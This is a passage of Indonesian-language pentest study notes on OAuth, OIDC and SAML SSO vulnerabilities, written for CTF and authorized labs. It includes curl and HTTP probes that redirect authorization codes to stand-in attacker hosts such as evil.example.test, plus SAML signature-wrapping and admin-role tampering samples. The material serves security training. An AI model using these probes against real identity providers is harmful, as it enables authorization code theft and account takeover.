---
id: "34"
title: "🔐 34 — OAuth & SSO Workflow"
category: "3. Web Exploitation"
categoryId: "web"
filename: "34_oauth_sso_workflow.md"
refs_out: ["27","28","29","30","33","35"]
refs_in: ["28","29","33","35"]
---

# 🔐 34 — OAuth & SSO Workflow

← [File 33: CORS](/docs/cors)  
→ [File 35: Active Directory Initial Enumeration](/docs/ad-initial-enumeration)

> **Scope:** CTF, PortSwigger Web Security Academy, HTB, Root-Me, dan lab yang memang Anda punya izin untuk uji.  
> **OS:** Parrot OS XFCE / Debian-based  
> **Goal:** membangun muscle memory untuk menemukan, memahami, menguji, dan membuktikan OAuth/OIDC/SSO vulnerabilities.
> 
> ⚠️ **WARNING:** Jangan menguji OAuth/SSO terhadap akun atau aplikasi pihak lain tanpa izin. Redirect URI abuse, token leakage, account linking, SAML tampering, dan token replay dapat menyebabkan account takeover. Gunakan account lab, test client, dan target yang memang diizinkan.

---

# 🧠 BAGIAN 0 — FUNDAMENTALS

## 0.1 Apa Itu OAuth 2.0

### 🎯 Masalah yang OAuth Selesaikan

Bayangkan Anda membuat aplikasi:

```text
MyPhotoApp
```

dan Anda ingin aplikasi tersebut mengakses foto dari:

```text
PhotoProvider
```

Cara buruk:

```text
User
 ↓
memberikan username + password PhotoProvider
 ↓
MyPhotoApp menyimpan password
```

Masalah:

```text
MyPhotoApp sekarang mengetahui password user.
```

OAuth dirancang agar aplikasi tidak perlu memperoleh password resource owner untuk mendapatkan akses yang didelegasikan.

Konsepnya:

```text
User
 ↓
Authorization Server
 ↓
memberikan authorization
 ↓
Client mendapatkan access token
 ↓
Client mengakses Resource Server
```

---

# 🧳 Analogi Sederhana

Bayangkan Anda datang ke hotel.

```text
Anda = Resource Owner

Hotel Front Desk = Authorization Server

Teman yang Anda izinkan masuk = Client

Ruang hotel = Resource Server
```

Anda tidak memberikan master key hotel kepada teman.

Sebaliknya:

```text
Anda
 ↓
Front Desk
 ↓
"Berikan akses kamar 123"
 ↓
temporary/access credential
 ↓
Teman
 ↓
kamar 123
```

OAuth secara konseptual seperti mekanisme delegasi tersebut.

---

# ⚠️ OAuth vs Authentication

Ini harus benar-benar diingat:

```text
OAuth = Authorization
```

OAuth menjawab:

> "Aplikasi X boleh melakukan apa terhadap resource Y?"

Bukan:

> "Siapa sebenarnya user ini?"

---

## Authentication

Authentication menjawab:

```text
"Siapa kamu?"
```

Contoh:

```text
username
password
MFA
biometric
```

---

## Authorization

Authorization menjawab:

```text
"Apa yang boleh kamu lakukan?"
```

Contoh:

```text
read:profile
read:email
write:photos
admin:users
```

---

## OIDC

OpenID Connect menambahkan layer authentication/identity di atas OAuth 2.0.

Jadi:

```text
OAuth 2.0
    ↓
Authorization

OIDC
    ↓
Authentication / Identity
    +
OAuth 2.0
```

---

# 👥 Empat Aktor OAuth

|Aktor|Arti|
|---|---|
|Resource Owner|User yang memiliki resource|
|Client|Aplikasi yang meminta akses|
|Authorization Server|Server yang mengautorisasi user dan mengeluarkan authorization artifact/token|
|Resource Server|Server yang menyimpan/menyediakan protected resource|

---

# 🗺️ Diagram OAuth Dasar

```text
                         ┌──────────────────────┐
                         │   Resource Owner     │
                         │        User          │
                         └──────────┬───────────┘
                                    │
                                    │ authorize
                                    ▼
                         ┌──────────────────────┐
                         │ Authorization Server │
                         │                      │
                         │ /authorize           │
                         │ /token               │
                         └──────────┬───────────┘
                                    │
                          token/code │
                                    ▼
                         ┌──────────────────────┐
                         │       Client         │
                         │      App/Web         │
                         └──────────┬───────────┘
                                    │
                              access token
                                    │
                                    ▼
                         ┌──────────────────────┐
                         │   Resource Server    │
                         │       /api           │
                         └──────────────────────┘
```

---

# 🔑 0.2 Grant Types / Flow Types

> Terminologi modern OAuth lebih sering membicarakan **flows** dan token exchange daripada sekadar "grant types". Untuk CTF/lab, nama-nama di bawah tetap sangat berguna.

---

# A — Authorization Code Flow

## 🧠 Kapan Digunakan?

Ini adalah flow yang sangat umum untuk:

```text
web application
server-side application
confidential clients
```

Konsep utamanya:

```text
Authorization Code
        ↓
Client backend
        ↓
Token endpoint
        ↓
Access Token
```

Authorization code bukan access token.

---

## 🗺️ Diagram Lengkap

```text
┌──────────┐
│  Browser │
└────┬─────┘
     │
     │ 1. GET /authorize
     │    client_id
     │    redirect_uri
     │    response_type=code
     │    scope
     │    state
     ▼
┌──────────────────────┐
│ Authorization Server │
└──────────┬───────────┘
           │
           │ 2. Login / Consent
           ▼
      ┌──────────┐
      │   User   │
      └────┬─────┘
           │
           │ approve
           ▼
┌──────────────────────┐
│ Authorization Server │
└──────────┬───────────┘
           │
           │ 3. Redirect
           │
           │ /callback?code=ABC&state=XYZ
           ▼
┌──────────────────────┐
│       Client         │
│       Backend        │
└──────────┬───────────┘
           │
           │ 4. POST /token
           │    code=ABC
           │    client_id
           │    client_secret
           │    redirect_uri
           ▼
┌──────────────────────┐
│ Authorization Server │
└──────────┬───────────┘
           │
           │ 5. access_token
           ▼
┌──────────────────────┐
│       Client         │
└──────────┬───────────┘
           │
           │ 6. Authorization: Bearer
           ▼
┌──────────────────────┐
│   Resource Server    │
└──────────────────────┘
```

---

## HTTP Authorization Request

```http
GET /authorize?response_type=code&client_id=web-client-123&redirect_uri=https%3A%2F%2Fapp.example.test%2Foauth%2Fcallback&scope=openid%20profile%20email&state=7b1d9c4f HTTP/1.1
Host: auth.example.test
User-Agent: Mozilla/5.0
Accept: text/html
```

Authorization response:

```http
HTTP/1.1 302 Found
Location: https://app.example.test/oauth/callback?code=SplxlOBeZQQYbYS6WxSbIA&state=7b1d9c4f
Cache-Control: no-store
```

Token request:

```http
POST /token HTTP/1.1
Host: auth.example.test
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=SplxlOBeZQQYbYS6WxSbIA&redirect_uri=https%3A%2F%2Fapp.example.test%2Foauth%2Fcallback&client_id=web-client-123&client_secret=LAB_CLIENT_SECRET
```

Token response:

```http
HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-store

{
  "access_token": "LAB_ACCESS_TOKEN",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "openid profile email"
}
```

---

## Security Considerations

Perhatikan:

```text
redirect_uri
state
code
client authentication
scope
token endpoint
```

Vulnerability terkenal:

```text
redirect_uri bypass
authorization code leakage
state missing
scope manipulation
client confusion
code interception
```

---

# B — Authorization Code + PKCE

## 🧠 Kapan Digunakan?

Sangat relevan untuk:

```text
SPA
mobile apps
native apps
public clients
```

PKCE menambahkan:

```text
code_verifier
code_challenge
```

---

## 🗺️ Diagram

```text
Client
  │
  │ generate code_verifier
  │
  │ hash(verifier)
  ▼
code_challenge
  │
  ▼
Authorization Server
  │
  │ authorization code
  ▼
Client
  │
  │ code + code_verifier
  ▼
Token Endpoint
  │
  │ verify verifier
  ▼
Access Token
```

---

## Authorization Request

```http
GET /authorize?response_type=code&client_id=spa-123&redirect_uri=https%3A%2F%2Fapp.example.test%2Fcallback&scope=openid%20profile&state=LAB_STATE&code_challenge=LAB_CODE_CHALLENGE&code_challenge_method=S256 HTTP/1.1
Host: auth.example.test
```

---

## Token Request

```http
POST /token HTTP/1.1
Host: auth.example.test
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&client_id=spa-123&redirect_uri=https%3A%2F%2Fapp.example.test%2Fcallback&code=LAB_CODE&code_verifier=LAB_CODE_VERIFIER
```

---

## Security Considerations

PKCE dirancang untuk mengurangi risiko authorization code interception.

Tetapi:

```text
PKCE enabled
≠
all OAuth bugs fixed
```

Masih perlu memeriksa:

```text
redirect_uri
state
client_id
scope
token audience
issuer
nonce
account linking
```

---

# C — Implicit Flow

## 🧓 Status

Implicit flow adalah flow lama yang masih bisa ditemukan di:

```text
legacy application
CTF
training lab
older SPA
```

Access token dapat dikembalikan melalui browser redirect.

---

## 🗺️ Diagram

```text
Browser
   │
   │ response_type=token
   ▼
Authorization Server
   │
   │ redirect
   ▼
https://app.example.test/callback#access_token=LAB_TOKEN
   │
   ▼
JavaScript
   │
   ▼
Access Token
```

Contoh:

```http
GET /authorize?response_type=token&client_id=legacy-spa&redirect_uri=https%3A%2F%2Fapp.example.test%2Fcallback&scope=profile HTTP/1.1
Host: auth.example.test
```

Response:

```http
HTTP/1.1 302 Found
Location: https://app.example.test/callback#access_token=LAB_ACCESS_TOKEN&token_type=Bearer&expires_in=3600
```

---

## Security Considerations

Token berada di browser context:

```text
URL fragment
browser history/tooling exposure
client-side JS
redirect handling
```

Karena itu implicit flow mempunyai exposure model yang berbeda dari authorization code + PKCE.

---

# D — Client Credentials

## 🧠 Kapan Digunakan?

Untuk:

```text
server-to-server
machine-to-machine
backend service
```

Tidak ada user resource owner dalam flow klasik ini.

---

## 🗺️ Diagram

```text
Client Service
     │
     │ client_id
     │ client_secret
     ▼
Authorization Server
     │
     │ access token
     ▼
Client Service
     │
     │ Bearer token
     ▼
Resource Server
```

Request:

```http
POST /token HTTP/1.1
Host: auth.example.test
Content-Type: application/x-www-form-urlencoded
Authorization: Basic bGFiLWNsaWVudDpsYWItc2VjcmV0

grant_type=client_credentials&scope=api.read
```

Response:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "access_token": "LAB_SERVICE_TOKEN",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "api.read"
}
```

---

## Security Considerations

Pertanyaan penting:

```text
Can client secret leak?
Can token access too much?
Is scope minimized?
Is token audience correct?
```

---

# E — Resource Owner Password

## 🧓 Legacy

Flow:

```text
User password
    ↓
Client
    ↓
Authorization Server
    ↓
Access Token
```

Request:

```http
POST /token HTTP/1.1
Host: auth.example.test
Content-Type: application/x-www-form-urlencoded

grant_type=password&username=alice&password=LAB_PASSWORD&client_id=legacy-app&scope=read
```

Response:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "access_token": "LAB_ACCESS_TOKEN",
  "token_type": "Bearer",
  "expires_in": 3600
}
```

Security problem:

```text
Client sees user password
```

Karena itu flow ini legacy dan tidak seharusnya menjadi default untuk modern deployments.

---

# 🆚 Grant/Flow Comparison

|Flow|User|Token Location/Exchange|Typical Use|Risk Focus|
|---|---|---|---|---|
|Authorization Code|✅|Code → token endpoint|Web apps|redirect/state/code|
|Code + PKCE|✅|Code + verifier|SPA/mobile|PKCE/state/redirect|
|Implicit|✅|Browser redirect|Legacy SPA|token leakage|
|Client Credentials|❌|Token endpoint|Server-to-server|secret/scope|
|Password|✅|Username/password → token|Legacy|password exposure|

---

# 🪪 0.3 OpenID Connect (OIDC)

## OAuth vs OIDC

```text
OAuth
  ↓
Authorization

OIDC
  ↓
Authentication / identity
  +
OAuth authorization
```

---

# 🎫 Access Token vs ID Token

|Token|Tujuan|
|---|---|
|Access Token|Mengakses Resource Server|
|ID Token|Memberi informasi identitas kepada OIDC client|

Jangan melakukan:

```text
"ID token = API access token"
```

Secara desain, keduanya mempunyai tujuan berbeda.

---

# 🧾 JWT dalam OIDC

ID Token sering berupa JWT:

```text
HEADER.PAYLOAD.SIGNATURE
```

Contoh payload lab:

```json
{
  "iss": "https://auth.example.test",
  "sub": "248289761001",
  "aud": "web-client-123",
  "exp": 1893456000,
  "iat": 1893452400,
  "nonce": "LAB_NONCE",
  "email": "alice@example.test"
}
```

Perhatikan:

```text
iss
sub
aud
exp
iat
nonce
```

---

# 👤 UserInfo Endpoint

Contoh:

```http
GET /userinfo HTTP/1.1
Host: auth.example.test
Authorization: Bearer LAB_ACCESS_TOKEN
Accept: application/json
```

Response:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "sub": "248289761001",
  "name": "Alice Example",
  "email": "alice@example.test",
  "email_verified": true
}
```

---

# 🔎 Scopes

|Scope|Tujuan umum|
|---|---|
|`openid`|Mengaktifkan OIDC|
|`profile`|Klaim profil|
|`email`|Klaim email|

Contoh:

```text
scope=openid profile email
```

---

# ⚠️ 0.4 Kapan OAuth Menjadi Berbahaya?

Jangan berpikir:

```text
OAuth endpoint
      ↓
vulnerable
```

Gunakan:

```text
OAuth endpoint
      ↓
Understand flow
      ↓
Identify trust boundaries
      ↓
Find validation weakness
      ↓
Determine impact
```

---

## Vulnerability Memerlukan Conditions

Contoh redirect URI:

```text
attacker-controlled redirect
+
authorization code/token
+
weak redirect validation
```

State:

```text
missing/weak state binding
+
attacker-controlled OAuth transaction
+
victim browser
```

Account linking:

```text
weak identity binding
+
attacker-controlled identity claim
+
automatic linking
```

---

## Misconfiguration vs Design Flaw

### Misconfiguration

Contoh:

```text
OAuth server seharusnya hanya menerima:

https://app.example.test/callback

tetapi menerima:

https://evil.example/callback
```

### Design flaw

Misalnya aplikasi percaya:

```text
email claim == account owner
```

tanpa memvalidasi dengan benar:

```text
issuer
audience
signature
email_verified
identity binding
```

---

# 💥 BAGIAN 1 — OAUTH VULNERABILITIES

# 1.1 Insecure Redirect URI 🚨

## 🧠 Analogi

Bayangkan security guard mengatakan:

```text
"Surat penting boleh dikirim ke alamat yang diawali dengan:
https://app.example.test/"
```

Kemudian attacker memberikan:

```text
https://app.example.test.evil.test/
```

atau menggunakan parser confusion.

Masalahnya bukan OAuth itu sendiri.

Masalahnya:

```text
redirect URI validation lemah
```

---

# 🎯 Kenapa `redirect_uri` Sangat Penting?

Authorization server menggunakannya sebagai tujuan redirect setelah authorization.

Contoh:

```text
https://app.example.test/oauth/callback
```

Dengan authorization code:

```text
https://app.example.test/oauth/callback?code=ABC123&state=XYZ
```

Jika attacker bisa mengendalikan tujuan tersebut:

```text
authorization code
        ↓
attacker-controlled location
```

PortSwigger secara khusus merekomendasikan pengujian ketat terhadap `redirect_uri` dan menjelaskan bahwa validation lemah dapat memungkinkan code/token dikirim ke redirect URI yang dikendalikan attacker.

---

# 🔍 Detection

Normal:

```http
GET /authorize?response_type=code&client_id=web-client-123&redirect_uri=https%3A%2F%2Fapp.example.test%2Foauth%2Fcallback&scope=openid%20profile&state=LAB_STATE HTTP/1.1
Host: auth.example.test
```

Test:

```text
redirect_uri=https://evil.example.test/callback
```

---

# 🧪 Burp Step-by-Step

```text
1. Capture /authorize request.
2. Send to Repeater.
3. Locate redirect_uri.
4. Decode URL encoding if necessary.
5. Replace with an attacker-controlled lab URL.
6. Send.
7. Observe:
   - 302
   - error
   - invalid_redirect_uri
   - authorization page
8. If accepted, continue only in authorized lab.
```

---

# 🧩 Bypass Technique 1 — Prefix/Path Confusion

Original:

```text
https://app.example.test/oauth/callback
```

Candidate:

```text
https://app.example.test/oauth/callback/evil
```

Request:

```http
GET /authorize?response_type=code&client_id=web-client-123&redirect_uri=https%3A%2F%2Fapp.example.test%2Foauth%2Fcallback%2Fevil&scope=openid HTTP/1.1
Host: auth.example.test
```

---

# 🧩 Bypass Technique 2 — Query Parameter

```text
https://app.example.test/oauth/callback?next=https://evil.example.test
```

Test:

```http
GET /authorize?response_type=code&client_id=web-client-123&redirect_uri=https%3A%2F%2Fapp.example.test%2Foauth%2Fcallback%3Fnext%3Dhttps%3A%2F%2Fevil.example.test&scope=openid HTTP/1.1
Host: auth.example.test
```

Tujuannya mencari parser discrepancy.

---

# 🧩 Bypass Technique 3 — Fragment Handling

```text
https://app.example.test/oauth/callback#anything
```

Fragment biasanya tidak dikirim dalam HTTP request ke server, sehingga penting memahami **siapa yang mem-parsing URI dan kapan**.

Jangan menganggap:

```text
fragment accepted
=
redirect bypass
```

---

# 🧩 Bypass Technique 4 — Subdomain

Trusted:

```text
https://app.example.test
```

Candidate:

```text
https://evil.app.example.test
```

atau:

```text
https://app.example.test.evil.test
```

Request:

```http
GET /authorize?response_type=code&client_id=web-client-123&redirect_uri=https%3A%2F%2Fevil.app.example.test%2Fcallback&scope=openid HTTP/1.1
Host: auth.example.test
```

---

# 🧩 Bypass Technique 5 — Parsing Discrepancy

Test characters/structures seperti:

```text
https://app.example.test@evil.example.test/callback
https://app.example.test:443@evil.example.test/callback
```

Hanya lakukan sebagai lab validation.

Tujuan:

```text
validator A
     ↓
menganggap trusted

parser B
     ↓
menganggap attacker-controlled
```

---

# 🧩 Bypass Technique 6 — Path Normalization

Contoh candidate:

```text
https://app.example.test/oauth/../callback
```

atau aplikasi-specific normalization cases.

---

# ⚠️ Jangan Menyimpulkan dari Acceptance Saja

```text
redirect_uri accepted
        ≠
authorization code stolen
```

Harus dibuktikan:

```text
accepted redirect
     ↓
authorization response
     ↓
code/token reaches attacker-controlled lab location
```

---

# 🛠️ curl Test

```bash
# Test legitimate redirect URI
curl -i \
  'https://auth.example.test/authorize?response_type=code&client_id=web-client-123&redirect_uri=https%3A%2F%2Fapp.example.test%2Foauth%2Fcallback&scope=openid&state=LAB_STATE'

# Test attacker origin
curl -i \
  'https://auth.example.test/authorize?response_type=code&client_id=web-client-123&redirect_uri=https%3A%2F%2Fevil.example.test%2Fcallback&scope=openid&state=LAB_STATE'

# Test subdomain candidate
curl -i \
  'https://auth.example.test/authorize?response_type=code&client_id=web-client-123&redirect_uri=https%3A%2F%2Fevil.app.example.test%2Fcallback&scope=openid&state=LAB_STATE'
```

---

# 💥 Impact

Potential:

```text
authorization code theft
access token theft
account takeover
OAuth login CSRF
```

---

# 1.2 State Parameter Missing/Weak 🛡️

## 🧠 Fungsi `state`

`state` mengikat authorization transaction dengan browser/session yang memulainya.

Konsep:

```text
Browser A
  ↓
generates state=A123
  ↓
OAuth request
  ↓
callback?code=ABC&state=A123
```

Client memeriksa:

```text
received state == expected state
```

---

# 🔐 State dan CSRF

Tanpa binding:

```text
Attacker
   ↓
membuat authorization flow
   ↓
menghasilkan code
   ↓
membujuk victim membuka callback
   ↓
client menerima code
```

Dengan state:

```text
Attacker state
     ≠
Victim session state
     ↓
reject
```

PortSwigger juga menjelaskan pentingnya state yang tidak dapat ditebak dan terikat dengan session user untuk membantu mencegah serangan CSRF-like pada OAuth.

---

# 🔍 Detection

Normal:

```http
GET /authorize?response_type=code&client_id=web-client-123&redirect_uri=https%3A%2F%2Fapp.example.test%2Foauth%2Fcallback&scope=openid&state=LAB_STATE HTTP/1.1
Host: auth.example.test
```

Test:

```text
hapus state
```

atau:

```text
state=ATTACKER_STATE
```

---

# 🧪 Burp Step-by-Step

```text
1. Capture OAuth authorization request.
2. Identify state.
3. Login using lab account.
4. Observe callback.
5. Record state value.
6. Repeat with:
   - no state
   - state=123
   - state=ATTACKER
7. Observe whether callback is accepted.
8. Determine whether state is tied to session.
```

---

# 💥 OAuth CSRF Scenario

```text
Attacker
    │
    │ prepares OAuth transaction
    ▼
Authorization Server
    │
    │ code
    ▼
Attacker-controlled transaction
    │
    │ victim browser
    ▼
Client callback
    │
    │ weak/missing state validation
    ▼
Victim session becomes linked to unintended OAuth identity
```

---

# 🛠️ curl

```bash
# Request with state
curl -i \
  'https://auth.example.test/authorize?response_type=code&client_id=web-client-123&redirect_uri=https%3A%2F%2Fapp.example.test%2Foauth%2Fcallback&scope=openid&state=LAB_STATE'

# Request without state
curl -i \
  'https://auth.example.test/authorize?response_type=code&client_id=web-client-123&redirect_uri=https%3A%2F%2Fapp.example.test%2Foauth%2Fcallback&scope=openid'

# Request with attacker-chosen state
curl -i \
  'https://auth.example.test/authorize?response_type=code&client_id=web-client-123&redirect_uri=https%3A%2F%2Fapp.example.test%2Foauth%2Fcallback&scope=openid&state=ATTACKER_STATE'
```

---

# 1.3 Authorization Code Interception 🕵️

## 🔍 Bagaimana Code Bisa Bocor?

Authorization code dapat muncul:

```text
/callback?code=...
```

Potential leak points:

```text
open redirect
Referrer
logs
browser history
proxy logs
analytics
third-party resources
```

---

# 📌 Referrer Leak

Misalnya callback page:

```text
https://app.example.test/callback?code=ABC123
```

lalu halaman memuat:

```html
<img src="/analytics/pixel">
```

atau resource external.

Dalam konfigurasi/flow tertentu, URL dapat menjadi referrer source dan menyebabkan credential-bearing URL information leak.

PortSwigger memperingatkan bahwa authorization codes dapat bocor melalui `Referer` headers ketika callback page memuat external resources.

---

# 🧪 Burp Test

```text
1. Complete OAuth flow.
2. Capture callback request.
3. Inspect query string.
4. Observe code.
5. Inspect response body.
6. Look for third-party:
   - image
   - JS
   - iframe
   - CSS
7. Observe subsequent requests.
8. Check whether sensitive callback URL is propagated.
```

---

# 🛠️ curl

```bash
# Fetch a lab callback page
curl -i \
  'https://app.example.test/oauth/callback?code=LAB_CODE&state=LAB_STATE'

# Follow redirects for analysis
curl -i -L \
  'https://app.example.test/oauth/callback?code=LAB_CODE&state=LAB_STATE'
```

---

# 1.4 Token Leakage 🔑

Token bisa bocor dari:

```text
URL
Referer
browser history
logs
analytics
screenshots
JavaScript
source maps
```

---

## Implicit Flow URL

```http
GET /callback#access_token=LAB_ACCESS_TOKEN&token_type=Bearer HTTP/1.1
Host: app.example.test
```

Catatan penting:

```text
fragment
```

secara normal tidak dikirim sebagai bagian HTTP request ke origin server.

Masalah token tetap dapat muncul di:

```text
browser
client-side JavaScript
history
third-party scripts
application logs/client telemetry
```

---

# Query Token

Jauh lebih buruk:

```text
https://app.example.test/callback?access_token=LAB_ACCESS_TOKEN
```

Karena query parameter dapat ikut terlihat di berbagai places:

```text
server logs
proxy logs
analytics
history
Referer
```

---

# 🛠️ curl

```bash
# Request a lab callback containing a token in query string
curl -i \
  'https://app.example.test/callback?access_token=LAB_ACCESS_TOKEN'

# Inspect redirect chain
curl -i -L \
  'https://app.example.test/callback?access_token=LAB_ACCESS_TOKEN'
```

---

# 1.5 Scope Manipulation 🎯

## Normal

```text
scope=openid profile
```

Test:

```text
scope=openid profile email admin
```

---

## HTTP Request

```http
GET /authorize?response_type=code&client_id=web-client-123&redirect_uri=https%3A%2F%2Fapp.example.test%2Foauth%2Fcallback&scope=openid%20profile%20email%20admin&state=LAB_STATE HTTP/1.1
Host: auth.example.test
```

---

## Apa yang Dicari?

Server seharusnya tidak hanya berkata:

```text
"client meminta admin"
```

lalu otomatis memberikan:

```text
scope=admin
```

Harus ada policy:

```text
registered scopes
approved scopes
consent
client permissions
resource permissions
```

---

## 🛠️ curl

```bash
# Test normal scope
curl -i \
  'https://auth.example.test/authorize?response_type=code&client_id=web-client-123&redirect_uri=https%3A%2F%2Fapp.example.test%2Foauth%2Fcallback&scope=openid%20profile&state=LAB_STATE'

# Test additional scope
curl -i \
  'https://auth.example.test/authorize?response_type=code&client_id=web-client-123&redirect_uri=https%3A%2F%2Fapp.example.test%2Foauth%2Fcallback&scope=openid%20profile%20admin&state=LAB_STATE'
```

---

# 💥 Impact

```text
scope escalation
unauthorized API access
privileged resource access
```

Jangan hanya melihat:

```text
scope accepted
```

Periksa:

```text
actual token scope
+
actual API authorization
```

---

# 1.6 PKCE Bypass 🔐

## Apa Itu PKCE?

PKCE menggunakan:

```text
code_verifier
```

dan:

```text
code_challenge
```

Concept:

```text
code_challenge =
BASE64URL(
    SHA256(code_verifier)
)
```

Flow:

```text
Client
  │
  │ code_challenge
  ▼
Authorization Server
  │
  │ code
  ▼
Client
  │
  │ code + code_verifier
  ▼
Token Endpoint
  │
  │ validate
  ▼
Access Token
```

---

# Weak PKCE Implementations

Cari:

```text
missing code_challenge
wrong method accepted
verifier not validated
challenge not bound to code
server accepts arbitrary verifier
```

---

# 🧪 Burp Test

```text
1. Capture authorization request.
2. Locate code_challenge.
3. Record code_challenge_method.
4. Complete flow.
5. Capture token request.
6. Modify code_verifier.
7. Observe response.
8. If modified verifier is accepted, investigate.
```

---

# 🛠️ curl

```bash
# Test authorization request with PKCE
curl -i \
  'https://auth.example.test/authorize?response_type=code&client_id=spa-123&redirect_uri=https%3A%2F%2Fapp.example.test%2Fcallback&scope=openid&state=LAB_STATE&code_challenge=LAB_CHALLENGE&code_challenge_method=S256'

# Test token exchange with an intentionally incorrect verifier in a lab
curl -i \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'grant_type=authorization_code&client_id=spa-123&redirect_uri=https%3A%2F%2Fapp.example.test%2Fcallback&code=LAB_CODE&code_verifier=WRONG_VERIFIER' \
  'https://auth.example.test/token'
```

Expected secure behavior:

```text
invalid_grant
invalid code_verifier
```

---

# 1.7 Account Linking Issues 🔗

## Problem

Aplikasi mempunyai:

```text
normal account
+
"Link Google/GitHub account"
```

Masalah muncul ketika aplikasi melakukan:

```text
email claim
    ↓
automatic account match
```

tanpa binding/verification yang kuat.

---

# Dangerous Pattern

```text
OAuth identity
      ↓
email = alice@example.test
      ↓
search local account
      ↓
"same email"
      ↓
link automatically
```

Email claim saja bukan identitas universal yang cukup tanpa memverifikasi issuer, audience, signature, verification status, dan account-binding policy.

---

# 🧪 Burp Detection

Cari:

```text
sub
iss
aud
email
email_verified
provider
account_id
```

Bandingkan:

```text
OIDC identity
vs
local account
```

---

# 🛠️ curl

```bash
# Inspect UserInfo endpoint in an authorized lab
curl -i \
  -H 'Authorization: Bearer LAB_ACCESS_TOKEN' \
  'https://auth.example.test/userinfo'

# Test account-linking endpoint using a lab token
curl -i \
  -H 'Authorization: Bearer LAB_ACCESS_TOKEN' \
  -H 'Content-Type: application/json' \
  --data '{"provider":"oidc","action":"link"}' \
  'https://app.example.test/api/account/link'
```

---

# 💥 Impact

```text
account linking confusion
login as wrong account
account takeover
cross-provider identity confusion
```

---

# 🏰 BAGIAN 2 — SSO VULNERABILITIES

# 2.1 SAML Basics

## Apa Itu SAML?

SAML:

```text
Security Assertion Markup Language
```

dipakai untuk:

```text
Single Sign-On
identity federation
enterprise authentication
```

---

# 👥 SP vs IdP

|Komponen|Fungsi|
|---|---|
|IdP|Identity Provider|
|SP|Service Provider|

Contoh konsep:

```text
IdP = corporate identity server

SP = payroll application
```

---

# 🧾 SAML Assertion

Assertion dapat berisi:

```xml
<saml:Assertion>
    <saml:Subject>
        <saml:NameID>alice@example.test</saml:NameID>
    </saml:Subject>

    <saml:AttributeStatement>
        <saml:Attribute Name="email">
            <saml:AttributeValue>
                alice@example.test
            </saml:AttributeValue>
        </saml:Attribute>

        <saml:Attribute Name="role">
            <saml:AttributeValue>
                user
            </saml:AttributeValue>
        </saml:Attribute>
    </saml:AttributeStatement>
</saml:Assertion>
```

---

# 🗺️ SAML Flow

```text
┌──────────┐
│   User   │
└────┬─────┘
     │
     │ Visit SP
     ▼
┌──────────┐
│    SP    │
└────┬─────┘
     │
     │ SAML Authn Request
     ▼
┌──────────┐
│   IdP    │
└────┬─────┘
     │
     │ Authenticate User
     ▼
┌──────────┐
│   User   │
└────┬─────┘
     │
     │ approved
     ▼
┌──────────┐
│   IdP    │
└────┬─────┘
     │
     │ SAMLResponse
     ▼
┌──────────┐
│    SP    │
└────┬─────┘
     │
     │ validate signature
     │ validate assertion
     ▼
┌──────────┐
│ Logged In│
└──────────┘
```

---

# 2.2 SAML XML Signature Wrapping (XSW) 🧬

## 🧠 Apa Itu XML Signature?

SAML assertion dapat ditandatangani secara digital.

Secara konsep:

```text
Assertion
    ↓
Signature
    ↓
SP verifies signature
```

Masalah XSW:

```text
signed node
    +
attacker-added node
    +
parser/verification discrepancy
    ↓
signature verifies
but application consumes attacker-controlled node
```

---

# 🗺️ XSW Conceptual Flow

```text
Original XML

<Response>
   <Assertion ID="A1">
      identity=alice
      <Signature>VALID</Signature>
   </Assertion>
</Response>

XSW-style structure

<Response>
   <Wrapper>
      <Assertion ID="A1">
         identity=alice
         <Signature>VALID</Signature>
      </Assertion>
   </Wrapper>

   <Assertion>
      identity=attacker
   </Assertion>
</Response>
```

Vulnerability terjadi apabila:

```text
signature validator
        ↓
uses signed Assertion A1

application
        ↓
uses different Assertion
```

---

# 🧰 SAML Raider

SAML Raider adalah Burp extension untuk pengujian SAML. Project resminya menyediakan message editor, certificate management, dan dukungan untuk beberapa teknik XSW. Cara instalasi yang direkomendasikan adalah melalui Burp BApp Store, dengan manual JAR installation sebagai alternatif.

---

# 🛠️ Setup SAML Raider

Di Burp:

```text
Extensions
   ↓
BApp Store
   ↓
SAML Raider
   ↓
Install
```

Manual:

```text
Extensions
   ↓
Installed
   ↓
Add
   ↓
Extension type: Java
   ↓
Select SAML Raider JAR
```

---

# 🧪 SAML XSW Testing Workflow

```text
1. Capture SAMLResponse.
2. Send to Repeater.
3. Open SAML Raider editor.
4. Decode SAML.
5. Identify:
   - Response
   - Assertion
   - Signature
   - Subject
   - Conditions
6. Understand which node is signed.
7. Create controlled structural mutation.
8. Preserve/observe signature behavior.
9. Send to lab SP.
10. Determine:
    - signature valid?
    - authentication accepted?
    - identity consumed by application?
```

---

# 2.3 SAML Assertion Manipulation ✏️

## Attributes yang Menarik

```text
email
NameID
role
group
username
department
admin
```

Contoh:

```xml
<saml:Attribute Name="role">
    <saml:AttributeValue>user</saml:AttributeValue>
</saml:Attribute>
```

Lab test:

```xml
<saml:Attribute Name="role">
    <saml:AttributeValue>admin</saml:AttributeValue>
</saml:Attribute>
```

Tetapi:

```text
ubah XML
≠
valid assertion
```

Jika signature diverifikasi:

```text
modified XML
      ↓
signature mismatch
      ↓
reject
```

---

# Email Claim Manipulation

Contoh:

```xml
<saml:NameID>
    alice@example.test
</saml:NameID>
```

Dalam lab, ubah menjadi test identity:

```xml
<saml:NameID>
    admin@example.test
</saml:NameID>
```

Lalu lihat:

```text
signature validation
+
identity mapping
+
authorization
```

---

# Role Manipulation

Contoh:

```xml
<saml:Attribute Name="groups">
    <saml:AttributeValue>users</saml:AttributeValue>
</saml:Attribute>
```

Candidate:

```xml
<saml:Attribute Name="groups">
    <saml:AttributeValue>admins</saml:AttributeValue>
</saml:Attribute>
```

Jangan menganggap accepted XML sebagai privilege escalation.

Bukti impact memerlukan:

```text
Assertion accepted
+
claim trusted
+
authorization changes
```

---

# 2.4 JWT dalam OAuth/OIDC 🪪

Hubungkan konsep ini dengan:

← **File 28: JWT Workflow**

JWT dapat muncul sebagai:

```text
Access Token
ID Token
```

---

# JWT Access Token

Contoh:

```text
Authorization: Bearer eyJhbGciOiJSUzI1NiIs...
```

